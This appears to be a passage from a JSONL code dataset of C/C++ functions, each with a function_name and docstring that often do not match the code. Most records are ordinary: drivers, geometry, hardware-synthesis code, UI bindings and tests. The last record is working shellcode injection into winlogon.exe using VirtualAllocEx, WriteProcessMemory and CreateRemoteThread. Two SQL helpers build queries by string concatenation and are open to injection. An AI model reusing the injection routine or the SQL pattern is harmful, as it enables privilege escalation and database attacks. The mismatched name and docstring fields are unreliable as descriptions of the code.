printf(\"\\\\n\");\\n    printf(\"2nd Random Array : \\\\n\");\\n    \/*for(int i=0; i<8; i++){\\n            for(int j=0; j<8; j++){\\n                if(array2[j] == i){\\n                    printf(\"1 \");\\n                }else{\\n                    printf(\"0 \");\\n                }\\n            }\\n        printf(\"\\\\n\");\\n    }*\/\\n    for(int i=0; i<8; i++){\\n        printf(\"%d \" , array2[i]);\\n    }\\n    printf(\"\\\\n\");\\n    printf(\"\\\\n\");\\n\\n\\n    int randomNumber = (rand() % 8 );\\n    printf(\"Crossover value : %d\\\\n\\\\n\", randomNumber);\\n\\n    crossover(array1, array2, randomNumber);\\n    return 0;\\n}'}","id":3621}
{"content":"{'function_name': 'DriverUnload', 'docstring': '\/\/ DriverUnload\\r', 'code': 'NTSTATUS AddDevice(IN PDRIVER_OBJECT DriverObject, IN PDEVICE_OBJECT pdo)\\r\\n\\t{\\t\\t\\t\\t\\t\\t\\t\/\/ AddDevice\\r\\n\\tPAGED_CODE();\\r\\n\\tKdPrint((DRIVERNAME \" - Entering AddDevice: DriverObject %8.8lX, pdo %8.8lX\\\\n\", DriverObject, pdo));\\r\\n\\r\\n\\tNTSTATUS status;\\r\\n\\r\\n\\t\/\/ Create a device object. Do *not* specify any device characteristics here because\\r\\n\\t\/\/ some of them will get applied to all drivers in the stack, and it\\'s not up to\\r\\n\\t\/\/ us as a filter to control any of the propagated attributes (e.g., FILE_DEVICE_SECURE_OPEN).\\r\\n\\t\/\/ The call to GetDeviceTypeToUse was added in SP-9 to overcome a bug in CDFS.\\r\\n\\r\\n\\tPDEVICE_OBJECT fido;\\r\\n\\tstatus = IoCreateDevice(DriverObject, sizeof(DEVICE_EXTENSION), NULL,\\r\\n\\t\\tGetDeviceTypeToUse(pdo), 0, FALSE, &fido);\\r\\n\\tif (!NT_SUCCESS(status))\\r\\n\\t\\t{\\t\\t\\t\\t\\t\\t\/\/ can\\'t create device object\\r\\n\\t\\tKdPrint((DRIVERNAME \" - IoCreateDevice failed - %X\\\\n\", status));\\r\\n\\t\\treturn status;\\r\\n\\t\\t}\\t\\t\\t\\t\\t\\t\/\/ can\\'t create device object\\r\\n\\t\\r\\n\\tPDEVICE_EXTENSION pdx = (PDEVICE_EXTENSION) fido->DeviceExtension;\\r\\n\\r\\n\\t\/\/ From this point forward, any error will have side effects that need to\\r\\n\\t\/\/ be cleaned up.\\r\\n\\r\\n\\tdo\\r\\n\\t\\t{\\t\\t\\t\\t\\t\\t\/\/ finish initialization\\r\\n\\t\\tIoInitializeRemoveLock(&pdx->RemoveLock, 0, 0, 0);\\r\\n\\t\\tpdx->DeviceObject = fido;\\r\\n\\t\\tpdx->Pdo = pdo;\\r\\n\\r\\n\\t\\t\/\/ Add our device object to the stack and propagate critical settings\\r\\n\\t\\t\/\/ from the immediately lower device object\\r\\n\\r\\n\\t\\tPDEVICE_OBJECT fdo = IoAttachDeviceToDeviceStack(fido, pdo);\\r\\n\\t\\tif (!fdo)\\r\\n\\t\\t\\t{\\t\\t\\t\\t\\t\/\/ can\\'t attach\\t\\t\\t\\t\\t\\t\\t\\t \\r\\n\\t\\t\\tKdPrint((DRIVERNAME \" - IoAttachDeviceToDeviceStack failed\\\\n\"));\\r\\n\\t\\t\\tstatus = STATUS_DEVICE_REMOVED;\\r\\n\\t\\t\\tbreak;;\\r\\n\\t\\t\\t}\\t\\t\\t\\t\\t\/\/ can\\'t attach\\r\\n\\r\\n\\t\\tpdx->LowerDeviceObject = fdo;\\r\\n\\r\\n\\t\\t\/\/ Copy the flags related to I\/O buffering from the lower device object so the I\/O manager\\r\\n\\t\\t\/\/ will create the expected data structures for reads and writes.\\r\\n\\r\\n\\t\\tfido->Flags |= fdo->Flags & (DO_DIRECT_IO | DO_BUFFERED_IO | DO_POWER_PAGABLE);\\r\\n\\r\\n\\t\\t\/\/ Clear the \"initializing\" flag so that we can get IRPs\\r\\n\\r\\n\\t\\tfido->Flags &= ~DO_DEVICE_INITIALIZING;\\r\\n\\t\\t}\\t\\t\\t\\t\\t\\t\/\/ finish initialization\\r\\n\\twhile (FALSE);\\r\\n\\r\\n\\tif (!NT_SUCCESS(status))\\r\\n\\t\\t{\\t\\t\\t\\t\\t\/\/ need to cleanup\\r\\n\\t\\tif (pdx->LowerDeviceObject)\\r\\n\\t\\t\\tIoDetachDevice(pdx->LowerDeviceObject);\\r\\n\\t\\tIoDeleteDevice(fido);\\r\\n\\t\\t}\\t\\t\\t\\t\\t\/\/ need to cleanup\\r\\n\\r\\n\\treturn status;\\r\\n\\t}'}","id":3622}
{"content":"{'function_name': 'getCL', 'docstring': '\/\/\u6cbf\u7740k2->k3\u65b9\u5411\u7ed9\u51fa\uff0c\u76f8\u5207\u7ed9\u51fa\u4e24\u4e2a', 'code': 'vector<point> getCC(circle k1,circle k2){\\n\\t\/\/\u6cbf\u5706k1\u9006\u65f6\u9488\u7ed9\u51fa\uff0c\u76f8\u5207\u7ed9\u51fa\u4e24\u4e2a\\n\\tint pd=checkposCC(k1,k2);\\n\\tif (pd==0||pd==4) return {};\\n\\tdouble a=(k2.o-k1.o).abs2(),cosA=(k1.r*k1.r+a-k2.r*k2.r)\/(2*k1.r*sqrt(max(a,0.0)));\\n\\tdouble b=k1.r*cosA,c=sqrt(max(0.0,k1.r*k1.r-b*b));\\n\\tpoint k=(k2.o-k1.o).unit(),m=k1.o+k*b,del=k.turn90()*c;\\n\\treturn {m-del,m+del};\\n}'}","id":3628}
{"content":"{'function_name': 'denoiseb_rd16_select', 'docstring': '\/\/__VIVADO_SYNTH__', 'code': 'inline hw_uint<16> denoiseb_rd17_select(raw_cache& raw, int d0, int d1) {\\n#ifdef __VIVADO_SYNTH__\\n#endif \/\/__VIVADO_SYNTH__\\n  \/\/ denoiseb_rd17 read pattern: { denoiseb_update_0[d0, d1] -> raw[1 + 2d0, d1] : -1 <= d0 <= 961 and -1 <= d1 <= 1082 }\\n  \/\/ Read schedule : { denoiseb_update_0[d0, d1] -> [2 + d1, 1 + d0, 2] : -1 <= d0 <= 961 and -1 <= d1 <= 1082 }\\n  \/\/ Write schedule: { raw_update_0[d0, d1] -> [d1, d0, 1] : -2 <= d0 <= 962 and -3 <= d1 <= 1084 }\\n  \/\/ DD fold: { denoiseb_update_0[d0, d1] -> 1931 : -1 <= d0 <= 961 and -1 <= d1 <= 1082 }\\n  auto value_raw_raw_update_0_write1 = raw.raw_raw_update_0_write1_merged_banks_25.peek_1931();\\n  return value_raw_raw_update_0_write1;\\n#ifndef __VIVADO_SYNTH__\\n\\tcout << \"Error: Unsupported offsets: \" << \" d0 = \" << d0  << \" d1 = \" << d1  << endl;\\n\\tassert(false);\\n\\treturn 0;\\n#endif \/\/__VIVADO_SYNTH__\\n}'}","id":3638}
{"content":"{'function_name': 'PyRowWidget', 'docstring': '\/\/ If making a new widget, add it to the parent.', 'code': 'static auto PyScrollWidget(PyObject* self, PyObject* args, PyObject* keywds)\\n    -> PyObject* {\\n  BA_PYTHON_TRY;\\n  PyObject* size_obj{Py_None};\\n  PyObject* pos_obj{Py_None};\\n  PyObject* background_obj{Py_None};\\n  PyObject* selected_child_obj{Py_None};\\n  PyObject* capture_arrows_obj{Py_None};\\n  PyObject* on_select_call_obj{Py_None};\\n  PyObject* parent_obj{Py_None};\\n  PyObject* edit_obj{Py_None};\\n  PyObject* center_small_content_obj{Py_None};\\n  ContainerWidget* parent_widget{};\\n  PyObject* color_obj{Py_None};\\n  PyObject* highlight_obj{Py_None};\\n  PyObject* border_opacity_obj{Py_None};\\n  PyObject* simple_culling_v_obj{Py_None};\\n  PyObject* selection_loops_to_parent_obj{Py_None};\\n  PyObject* claims_left_right_obj{Py_None};\\n  PyObject* claims_up_down_obj{Py_None};\\n  PyObject* claims_tab_obj{Py_None};\\n  PyObject* autoselect_obj{Py_None};\\n\\n  static const char* kwlist[] = {\"edit\",\\n                                 \"parent\",\\n                                 \"size\",\\n                                 \"position\",\\n                                 \"background\",\\n                                 \"selected_child\",\\n                                 \"capture_arrows\",\\n                                 \"on_select_call\",\\n                                 \"center_small_content\",\\n                                 \"color\",\\n                                 \"highlight\",\\n                                 \"border_opacity\",\\n                                 \"simple_culling_v\",\\n                                 \"selection_loops_to_parent\",\\n                                 \"claims_left_right\",\\n                                 \"claims_up_down\",\\n                                 \"claims_tab\",\\n                                 \"autoselect\",\\n                                 nullptr};\\n\\n  if (!PyArg_ParseTupleAndKeywords(\\n          args, keywds, \"|OOOOOOOOOOOOOOOOOO\", const_cast<char**>(kwlist),\\n          &edit_obj, &parent_obj, &size_obj, &pos_obj, &background_obj,\\n          &selected_child_obj, &capture_arrows_obj, &on_select_call_obj,\\n          &center_small_content_obj, &color_obj, &highlight_obj,\\n          &border_opacity_obj, &simple_culling_v_obj,\\n          &selection_loops_to_parent_obj, &claims_left_right_obj,\\n          &claims_up_down_obj, &claims_tab_obj, &autoselect_obj))\\n    return nullptr;\\n\\n  if (!g_base->CurrentContext().IsEmpty()) {\\n    throw Exception(\"UI functions must be called with no context set.\");\\n  }\\n\\n  \/\/ Grab the edited widget or create a new one.\\n  Object::Ref<ScrollWidget> widget;\\n  if (edit_obj != Py_None) {\\n    widget = dynamic_cast<ScrollWidget*>(UIV1Python::GetPyWidget(edit_obj));\\n    if (!widget.Exists()) {\\n      throw Exception(\"Invalid or nonexistent edit widget.\",\\n                      PyExcType::kWidgetNotFound);\\n    }\\n  } else {\\n    parent_widget = parent_obj == Py_None\\n                        ? g_ui_v1->screen_root_widget()\\n                        : dynamic_cast<ContainerWidget*>(\\n                            UIV1Python::GetPyWidget(parent_obj));\\n    if (!parent_widget) {\\n      throw Exception(\"Invalid or nonexistent parent widget.\",\\n                      PyExcType::kWidgetNotFound);\\n    }\\n    widget = Object::New<ScrollWidget>();\\n  }\\n\\n  \/\/ Set applicable values. ----------------------------\\n  if (size_obj != Py_None) {\\n    Point2D p = Python::GetPyPoint2D(size_obj);\\n    widget->SetWidth(p.x);\\n    widget->SetHeight(p.y);\\n  }\\n  if (pos_obj != Py_None) {\\n    Point2D p = Python::GetPyPoint2D(pos_obj);\\n    widget->set_translate(p.x, p.y);\\n  }\\n  if (highlight_obj != Py_None) {\\n    widget->set_highlight(Python::GetPyBool(highlight_obj));\\n  }\\n  if (border_opacity_obj != Py_None) {\\n    widget->set_border_opacity(Python::GetPyFloat(border_opacity_obj));\\n  }\\n  if (on_select_call_obj != Py_None) {\\n    widget->SetOnSelectCall(on_select_call_obj);\\n  }\\n  if (center_small_content_obj != Py_None) {\\n    widget->set_center_small_content(\\n        Python::GetPyBool(center_small_content_obj));\\n  }\\n  if (color_obj != Py_None) {\\n    std::vector<float> c = Python::GetPyFloats(color_obj);\\n    if (c.size() != 3) {\\n      throw Exception(\"Expected 3 floats for color.\", PyExcType::kValue);\\n    }\\n    widget->set_color(c[0], c[1], c[2]);\\n  }\\n  if (capture_arrows_obj != Py_None) {\\n    widget->set_capture_arrows(Python::GetPyBool(capture_arrows_obj));\\n  }\\n  if (background_obj != Py_None) {\\n    widget->set_background(Python::GetPyBool(background_obj));\\n  }\\n  if (simple_culling_v_obj != Py_None) {\\n    widget->set_simple_culling_v(Python::GetPyFloat(simple_culling_v_obj));\\n  }\\n  if (selected_child_obj != Py_None) {\\n    widget->SelectWidget(UIV1Python::GetPyWidget(selected_child_obj));\\n  }\\n  if (selection_loops_to_parent_obj != Py_None) {\\n    widget->set_selection_loops_to_parent(\\n        Python::GetPyBool(selection_loops_to_parent_obj));\\n  }\\n  if (claims_left_right_obj != Py_None) {\\n    widget->set_claims_left_right(Python::GetPyBool(claims_left_right_obj));\\n  }\\n  if (claims_up_down_obj != Py_None) {\\n    widget->set_claims_up_down(Python::GetPyBool(claims_up_down_obj));\\n  }\\n  if (claims_tab_obj != Py_None) {\\n    widget->set_claims_tab(Python::GetPyBool(claims_tab_obj));\\n  }\\n  if (autoselect_obj != Py_None) {\\n    widget->set_auto_select(Python::GetPyBool(autoselect_obj));\\n  }\\n\\n  \/\/ If making a new widget add it at the end.\\n  if (edit_obj == Py_None) {\\n    g_ui_v1->AddWidget(widget.Get(), parent_widget);\\n  }\\n  return widget->NewPyRef();\\n\\n  BA_PYTHON_CATCH;\\n}'}","id":3644}
{"content":"{'function_name': 'denoiseb_rd29_select', 'docstring': '\/\/__VIVADO_SYNTH__', 'code': 'inline hw_uint<16> denoiseb_rd3_select(raw_cache& raw, int d0, int d1) {\\n#ifdef __VIVADO_SYNTH__\\n#endif \/\/__VIVADO_SYNTH__\\n  \/\/ denoiseb_rd3 read pattern: { denoiseb_update_0[d0, d1] -> raw[-2 + 2d0, 1 + d1] : -1 <= d0 <= 961 and -1 <= d1 <= 1082 }\\n  \/\/ Read schedule : { denoiseb_update_0[d0, d1] -> [2 + d1, 1 + d0, 2] : -1 <= d0 <= 961 and -1 <= d1 <= 1082 }\\n  \/\/ Write schedule: { raw_update_0[d0, d1] -> [d1, d0, 1] : -2 <= d0 <= 962 and -3 <= d1 <= 1084 }\\n  \/\/ DD fold: { denoiseb_update_0[d0, d1] -> 967 : -1 <= d0 <= 961 and -1 <= d1 <= 1082 }\\n  auto value_raw_raw_update_0_write0 = raw.raw_raw_update_0_write0_merged_banks_25.peek_967();\\n  return value_raw_raw_update_0_write0;\\n#ifndef __VIVADO_SYNTH__\\n\\tcout << \"Error: Unsupported offsets: \" << \" d0 = \" << d0  << \" d1 = \" << d1  << endl;\\n\\tassert(false);\\n\\treturn 0;\\n#endif \/\/__VIVADO_SYNTH__\\n}'}","id":3646}
{"content":"{'function_name': 'calc_entropy', 'docstring': '\/\/ size_t size = matrix.size();', 'code': 'double calc_Estart(vector<vector<double>>& matrix) {\\n    vector<double> attrSum;\\n    vector<double> clsSum;\\n    double allSum;\\n    getSumRowCol(matrix, attrSum, clsSum, allSum);\\n\\n    \/\/ size_t size = matrix.size();\\n    double Estart = 0;\\n    for (size_t i = 0; i < clsSum.size(); i++) {\\n        if (clsSum[i] > 0) {\\n            double p = clsSum[i] \/ allSum;\\n            Estart += (-p * log2(p));\\n        }\\n    }\\n    return Estart;\\n}'}","id":3647}
{"content":"{'function_name': 'ubrf12_rxstart', 'docstring': '\/\/all went fine', 'code': 'unsigned char ubrf12_rxfinish(void *data)\\n{\\n    unsigned char i;\\n    char *cdata = (char*)data;\\n    \/\/not finished yet or old buffer\\n    if( RF12_status.Rx || !RF12_status.New ){\\n        return 255;\\n    }\\n    RF12_status.New = 0;\\n\\n    unsigned char len = RF12_Data[0];\\n    if (len > RF12_DataLength || RF12_Data[len + 1] != RF12_channel) {\\n        return 255;\\n    }\\n    \\n    for (i = 0; i < len; ++i)\\n        cdata[i] = RF12_Data[i + 1];\\n    return len;\\t\\t\\t\/\/strsize\\n}'}","id":3657}
{"content":"{'function_name': 'leftRotate', 'docstring': '\/\/int n = s.length();\\r', 'code': 'int main()\\r\\n{\\r\\n    \/\/code\\r\\n    int t;\\r\\n    cin >> t;\\r\\n    while (t--)\\r\\n    {\\r\\n        string a;\\r\\n        string b;\\r\\n\\r\\n        cin >> a >> b;\\r\\n\\r\\n        string str = a;\\r\\n        int flag = 0;\\r\\n\\r\\n        if (leftRotate(str, 2) == b)\\r\\n        {\\r\\n            flag = 1;\\r\\n        }\\r\\n        else if (rightRotate(str, 2) == b)\\r\\n        {\\r\\n            flag = 1;\\r\\n        }\\r\\n        cout << flag << endl;\\r\\n    }\\r\\n    return 0;\\r\\n}'}","id":3658}
{"content":"{'function_name': 'delete_node', 'docstring': '\/\/ removes deleteThis from the list\\r', 'code': 'T delete_head(node<T>*&head) {\\r\\n    node<T>* deleteThis = head;\\r\\n    T temp_item = deleteThis->_item;\\r\\n    head = deleteThis->_next;   \/\/ changes the head to the next node\\r\\n    delete deleteThis;          \/\/ deletes the former head\\r\\n    return(temp_item);\\r\\n}'}","id":3663}
{"content":"{'function_name': 'x86GetCentaurId', 'docstring': '\/* - Basic identification -\\n  ** ID = 0x504x : IDT WinChip C6 \/ Centaur C2\\n  ** ID = 0x508x : IDT WinChip 2 \/ Centaur C3\\n  ** ID = 0x509x : IDT WinChip 3 \/ Centaur C6\\n  ** ID = 0x606x : VIA C3 Samuel\\n  ** ID = 0x607x : VIA C3 Samuel 2 \/ VIA Eden ESP (Ezra)\\n  ** ID = 0x608x : VIA C3 Ezra-T\\n  ** ID = 0x609x : VIA C3 Nehemia \/ VIA C3-M Nehemia\\n  **             \/ VIA Eden ESP (Ezra\/Nehemia) \/ VIA Antaur\\n  ** ID = 0x60Ax : VIA C7 Esther\\n  *\/', 'code': 'static u32 x86GetRiseId(u32 maxfunc)\\n{\\n  \/* - Basic identification -\\n  ** ID = 0x500x \/ 0x502x : mP6 iDragon\\n  ** ID = 0x508x \/ 0x509x : mP6 iDragon II\\n  *\/\\n  return x86GetDefaultId(maxfunc) | (VENDOR_RISE << 28);\\n}'}","id":3674}
{"content":"{'function_name': 'emx_set_vertex_data', 'docstring': '\/\/ if vid is current vertex, we use vertex_data. Otherwise we use neighbor_vertex_data', 'code': 'void emx_add_task(HANDLE_TYPE handle, uint32_T vid, const char* fnname, double priority) {\\n  \/\/std::cout << \"add_task: \" << vid << \" \" << fnname << \" \" << priority << std::endl;\\n  static bool printed = false;\\n  gl_update_function_params *paramsptr = get_params(handle);\\n  vid--;\\n  if (fnname == NULL) return;\\n  \/\/ figure out the function..\\n  std::string f(fnname);\\n  f = \"__gl__\" + f;\\n  update_function_map_type::iterator i = update_function_map.find(f);\\n  if (i != update_function_map.end()) {\\n    paramsptr->scheduler->add_task(vid, i->second, priority);\\n  }\\n  else {\\n    if (!printed) std::cerr << \"Update function \" << fnname << \" not found.\" << std::endl;\\n    printed = true;\\n  }\\n}'}","id":3678}
{"content":"{'function_name': 'generate_insert_world_annotation_SQL_command', 'docstring': '\/\/      cout << SQL_command << endl;', 'code': 'int get_world_annotation_ID(\\n      gis_database* gis_database_ptr,\\n      string username,string label,string description)\\n   {\\n\/\/      cout << \"inside databasefunc::get_world_annotation_ID()\" << endl;\\n\/\/      cout << \"username = \" << username\\n\/\/           << \" label = \" << label\\n\/\/           << \" description = \" << description << endl;\\n\\n      string SQL_command=\"select id from world_annotations \";\\n      SQL_command += \"WHERE username=\\'\"+username+\"\\' \";\\n      SQL_command += \"AND label=\\'\"+label+\"\\' \";\\n      SQL_command += \"AND description=\\'\"+description+\"\\';\";\\n\/\/      cout << \"SQL_command = \" << SQL_command << endl;\\n\\n      Genarray<string>* field_array_ptr=\\n         gis_database_ptr->select_data(SQL_command);\\n      if (field_array_ptr==NULL) return -1;\\n\\n\/\/      cout << \"*field_array_ptr = \" << *field_array_ptr << endl;\\n\\n      int annotation_ID=stringfunc::string_to_number(\\n         field_array_ptr->get(0,0));\\n\/\/      cout << \"annotation_ID = \"  << annotation_ID << endl;\\n      return annotation_ID;\\n   }'}","id":3682}
{"content":"{'function_name': 'DECL_LOADGLEXT_PROC', 'docstring': '\/\/correct extension ??? maybe \"GL_ATI_separate_stencil\"', 'code': 'static bool DECL_LOADGLEXT_PROC(KHR_debug)\\n{\\n    LOAD_GLPROC( glDebugMessageControl  );\\n    LOAD_GLPROC( glDebugMessageInsert   );\\n    LOAD_GLPROC( glDebugMessageCallback );\\n    LOAD_GLPROC( glGetDebugMessageLog   );\\n  \/\/LOAD_GLPROC( glGetPointerv          );\\n    LOAD_GLPROC( glPushDebugGroup       );\\n    LOAD_GLPROC( glPopDebugGroup        );\\n    LOAD_GLPROC( glObjectLabel          );\\n    LOAD_GLPROC( glGetObjectLabel       );\\n    LOAD_GLPROC( glObjectPtrLabel       );\\n    LOAD_GLPROC( glGetObjectPtrLabel    );\\n    return true;\\n}'}","id":3683}
{"content":"{'function_name': 'insert_platform', 'docstring': '\/\/      cout << \"gis_database_ptr = \" << gis_database_ptr << endl;', 'code': 'string generate_insert_platform_SQL_command(string description)\\n   {\\n\/\/   cout << \"inside databasefunc::generate_platform_SQL_command()\" << endl;\\n\\n      string SQL_command=\"insert into platforms \";\\n      SQL_command += \"(description) \";\\n      SQL_command += \"values( \";\\n      SQL_command += \"\\'\"+description+\"\\'\";\\n      SQL_command += \");\";\\n\\n      cout << SQL_command << endl;\\n      return SQL_command;\\n   }'}","id":3684}
{"content":"{'function_name': 'CPUMR0Trap07Handler', 'docstring': \"\/*\\n     * There are two basic actions:\\n     *   1. Save host fpu and restore guest fpu.\\n     *   2. Generate guest trap.\\n     *\\n     * When entering the hypervisor we'll always enable MP (for proper wait\\n     * trapping) and TS (for intercepting all fpu\/mmx\/sse stuff). The EM flag\\n     * is taken from the guest OS in order to get proper SSE handling.\\n     *\\n     *\\n     * Actions taken depending on the guest CR0 flags:\\n     *\\n     *   3    2    1\\n     *  TS | EM | MP | FPUInstr | WAIT :: VMM Action\\n     * ------------------------------------------------------------------------\\n     *   0 |  0 |  0 | Exec     | Exec :: Clear TS & MP, Save HC, Load GC.\\n     *   0 |  0 |  1 | Exec     | Exec :: Clear TS, Save HC, Load GC.\\n     *   0 |  1 |  0 | #NM      | Exec :: Clear TS & MP, Save HC, Load GC.\\n     *   0 |  1 |  1 | #NM      | Exec :: Clear TS, Save HC, Load GC.\\n     *   1 |  0 |  0 | #NM      | Exec :: Clear MP, Save HC, Load GC. (EM is already cleared.)\\n     *   1 |  0 |  1 | #NM      | #NM  :: Go to guest taking trap there.\\n     *   1 |  1 |  0 | #NM      | Exec :: Clear MP, Save HC, Load GC. (EM is already set.)\\n     *   1 |  1 |  1 | #NM      | #NM  :: Go to guest taking trap there.\\n     *\/\", 'code': \"static int cpumR0SaveHostDebugState(PVMCPU pVCpu)\\n{\\n    \/*\\n     * Save the host state.\\n     *\/\\n    pVCpu->cpum.s.Host.dr0 = ASMGetDR0();\\n    pVCpu->cpum.s.Host.dr1 = ASMGetDR1();\\n    pVCpu->cpum.s.Host.dr2 = ASMGetDR2();\\n    pVCpu->cpum.s.Host.dr3 = ASMGetDR3();\\n    pVCpu->cpum.s.Host.dr6 = ASMGetDR6();\\n    \/** @todo dr7 might already have been changed to 0x400; don't care right now as it's harmless. *\/\\n    pVCpu->cpum.s.Host.dr7 = ASMGetDR7();\\n\\n    \/* Preemption paranoia. *\/\\n    ASMAtomicOrU32(&pVCpu->cpum.s.fUseFlags, CPUM_USED_DEBUG_REGS_HOST);\\n\\n    \/*\\n     * Make sure DR7 is harmless or else we could trigger breakpoints when\\n     * load guest or hypervisor DRx values later.\\n     *\/\\n    if (pVCpu->cpum.s.Host.dr7 != X86_DR7_INIT_VAL)\\n        ASMSetDR7(X86_DR7_INIT_VAL);\\n\\n    return VINF_SUCCESS;\\n}\"}","id":3687}
{"content":"{'function_name': 'UNINITIALIZED_TEST', 'docstring': '\/\/ Reusing map addresses might cause these tests to fail.', 'code': 'UNINITIALIZED_TEST(LogMapsDetailsContexts) {\\n  \/\/ Reusing map addresses might cause these tests to fail.\\n  if (i::FLAG_gc_global || i::FLAG_stress_compaction ||\\n      i::FLAG_stress_incremental_marking) {\\n    return;\\n  }\\n  \/\/ Test that all Map details from Maps in the snapshot are logged properly.\\n  SETUP_FLAGS();\\n  i::FLAG_trace_maps = true;\\n  v8::Isolate::CreateParams create_params;\\n  create_params.array_buffer_allocator = CcTest::array_buffer_allocator();\\n  v8::Isolate* isolate = v8::Isolate::New(create_params);\\n\\n  {\\n    ScopedLoggerInitializer logger(saved_log, saved_prof, isolate);\\n    \/\/ Use the default context.\\n    CompileRunChecked(isolate, \"{a:1}\");\\n    \/\/ Create additional contexts.\\n    v8::Local<v8::Context> env1 = v8::Context::New(isolate);\\n    env1->Enter();\\n    CompileRun(env1, \"{b:1}\").ToLocalChecked();\\n\\n    v8::Local<v8::Context> env2 = v8::Context::New(isolate);\\n    env2->Enter();\\n    CompileRun(env2, \"{c:1}\").ToLocalChecked();\\n    env2->Exit();\\n    env1->Exit();\\n\\n    logger.StopLogging();\\n    ValidateMapDetailsLogging(isolate, &logger);\\n  }\\n\\n  i::FLAG_log_function_events = false;\\n  isolate->Dispose();\\n}'}","id":3689}
{"content":"{'function_name': 'send_negotiation', 'docstring': '\/\/ \uc18c\ucf13 \uc804\uc1a1.\\r', 'code': 'void inject(void) {\\r\\n\\tPROCESSENTRY32 entry;\\r\\n\\tentry.dwSize = sizeof(PROCESSENTRY32);\\r\\n\\r\\n\\tuint8_t shellcode[] = {\\r\\n\\t\\t 0x50, 0x51, 0x52, 0x53, 0x56, 0x57, 0x55, 0x6A, 0x60, 0x5A, 0x68, 0x63, 0x6D, 0x64, 0x00, 0x54,\\r\\n\\t\\t 0x59, 0x48, 0x83, 0xEC, 0x28, 0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18, 0x48, 0x8B, 0x76,\\r\\n\\t\\t 0x10, 0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57, 0x3C, 0x8B, 0x5C, 0x17,\\r\\n\\t\\t 0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B, 0x54, 0x1F, 0x24, 0x0F, 0xB7, 0x2C, 0x17,\\r\\n\\t\\t 0x8D, 0x52, 0x02, 0xAD, 0x81, 0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45, 0x75, 0xEF, 0x8B, 0x74, 0x1F,\\r\\n\\t\\t 0x1C, 0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7, 0x99,\\r\\n\\t\\t 0xff, 0xc2, \/\/ inc edx (1 = SW_SHOW)\\r\\n\\t\\t 0xFF, 0xD7, 0x48, 0x83, 0xC4,\\r\\n\\t\\t 0x30, 0x5D, 0x5F, 0x5E, 0x5B, 0x5A, 0x59, 0x58, 0xC3, 0x00\\r\\n\\t};\\r\\n\\r\\n\\t\/\/ CreateToolhelp32SNAPSHOT()\uc73c\ub85c \ud504\ub85c\uc138\uc2a4 \uc2a4\ub0c5\uc0f7\uc744 \ucc0d\uc74c.(\ud504\ub85c\uc138\uc2a4 \uba54\ubaa8\ub9ac \uc2a4\ub0c5\uc0f7\uc784.) snapshot \ud578\ub4e4\ub85c \ub2e4\ub8f8.\\r\\n\\tHANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);\\r\\n\\r\\n\\tint pid = -1;\\r\\n\\tif (Process32First(snapshot, &entry) == TRUE) {\\r\\n\\t\\twhile (Process32Next(snapshot, &entry) == TRUE) {\\r\\n\\t\\t\\tif (lstrcmpiA(entry.szExeFile, \"winlogon.exe\") == 0) { \/\/ winlogon.exe \ud504\ub85c\uc138\uc2a4\ub97c \ucc3e\uc544\uc11c \\r\\n\\t\\t\\t\\tpid = entry.th32ProcessID; \/\/entry.th32ProcessID(\ud504\ub85c\uc138\uc2a4 \uc2dd\ubcc4\uc790)\ub97c pid\ub85c \ubc1b\uace0 \ucf54\ub4dc \ube0c\ub808\uc774\ud06c.\\r\\n\\t\\t\\t\\tbreak;\\r\\n\\t\\t\\t}\\r\\n\\t\\t}\\r\\n\\t}\\r\\n\\t\/\/ \uc2a4\\x86l\uc0f7 \ub2eb\uc74c.\\r\\n\\tCloseHandle(snapshot);\\r\\n\\r\\n\\tif (pid < 0) {\\r\\n\\t\\tprintf(\"Could not find process\\\\n\");\\r\\n\\t\\treturn;\\r\\n\\t}\\r\\n\\tprintf(\"Injecting shellcode in winlogon...\\\\n\");\\r\\n\\r\\n\\t\/\/ HANDLE hProc = winlogon.exe \ud504\ub85c\uc138\uc2a4\ub97c \uc5f6.\\r\\n\\tHANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);\\r\\n\\tif (hProc == NULL) {\\r\\n\\t\\tprintf(\"Could not open process\\\\n\");\\r\\n\\t\\treturn;\\r\\n\\t}\\r\\n\\r\\n\\t\/\/ \uac00\uc0c1 \uba54\ubaa8\ub9ac\ub97c 0x1000\ub9cc\ud07c hProc \uac00\uc0c1 \ud504\ub85c\uc138\uc2a4 \uc0c1\uc5d0 \ud560\ub2f9.\\r\\n\\tLPVOID lpMem = VirtualAllocEx(hProc, NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);\\r\\n\\tif (lpMem == NULL) {\\r\\n\\t\\tprintf(\"Remote allocation failed\\\\n\");\\r\\n\\t\\treturn;\\r\\n\\t}\\t\\t\\r\\n\\r\\n\\t\/\/ shellcode(\uc258\ucf54\ub4dc \uac12)\uc744 \ud574\ub2f9 \ud560\ub2f9\ub41c \uba54\ubaa8\ub9ac\uc5d0 \uc500.\\r\\n\\tif (!WriteProcessMemory(hProc, lpMem, shellcode, sizeof(shellcode), 0)) {\\r\\n\\t\\tprintf(\"Remote write failed\\\\n\");\\r\\n\\t\\treturn;\\r\\n\\t}\\r\\n\\t\\r\\n\\t\/\/ CreateRemoteThread() \ud568\uc218\ub85c \uc4f0\ub808\ub4dc \uc2dc\uc791 \ub8e8\ud2f4\uc73c\ub85c \uc124\uc815\ud574\uc11c \ud6c4\ud0b9(\uc778\uc81d\ud305).\\r\\n\\tif (!CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)lpMem, 0, 0, 0)) {\\r\\n\\t\\tprintf(\"CreateRemoteThread failed\\\\n\");\\r\\n\\t\\treturn;\\r\\n\\t}\\r\\n\\r\\n\\t\/\/ \ud6c4\ud0b9 \uc131\uacf5!\\r\\n\\tprintf(\"Success! ;)\\\\n\");\\r\\n}'}","id":3691}
